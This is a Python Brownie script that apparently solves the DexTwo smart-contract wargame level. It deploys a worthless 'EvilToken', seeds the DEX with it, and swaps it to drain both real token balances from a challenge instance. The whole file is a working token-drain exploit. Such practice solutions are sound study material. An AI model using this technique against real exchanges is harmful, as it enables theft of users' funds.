from brownie import DexTwo, EvilToken, accounts, Contract


INSTANCE_ADDRESS = "0x675AD554dA7985B4637aaD7424f50b85341a54f5"
ACCOUNT = "straul"

def get_account():
    account = accounts.load(ACCOUNT)
    return account


def hack_dex(account):
    # deploy evil token
    print(f"Deploying evilToken...")
    evilToken = EvilToken.deploy("EvilToken", "EvT", 100000, {'from': account})

    # approve the dex to spend evilToken
    print(f"Approving dex to spend evilToken...")
    dex = Contract.from_abi(name="DEX", address=INSTANCE_ADDRESS, abi=DexTwo.abi)
    evilToken.approve(dex.address, 1000, {'from': account})

    # approve the dex to spend our tokens
    dex.approve(account.address, 5000, {'from': account})

    # add evilToken liquidity to unbalance the pool
    print(f"Adding liquidity...")
    dex.add_liquidity(evilToken, 1, {'from': account})
    # swap 1 evilToken for 100 token1 ( swap amount = 1 * 100 / 1)
    print(f"Swap evilToken for token1...")
    print(f"\tDEX's Token1 balance before swap: {dex.balanceOf(dex.token1(), dex.address)}")
    dex.swap(evilToken.address, dex.token1(), 1, {'from': account})
    print(f"\tDEX's Token1 balance after swap: {dex.balanceOf(dex.token1(), dex.address)}")

    # after we made the first swap, we now have 2 evilTokens inside DEX
    # swap 2 evilToken for 100 token2 ( swap amount = 2 * 100 / 2)
    print(f"Swap evilToken for token2...")
    print(f"\tDEX's Token2 balance before swap: {dex.balanceOf(dex.token2(), dex.address)}")
    dex.swap(evilToken.address, dex.token2(), 2, {'from': account})
    print(f"\tDEX's Token2 balance after swap: {dex.balanceOf(dex.token2(), dex.address)}")


def main():
    account = get_account()
    hack_dex(account)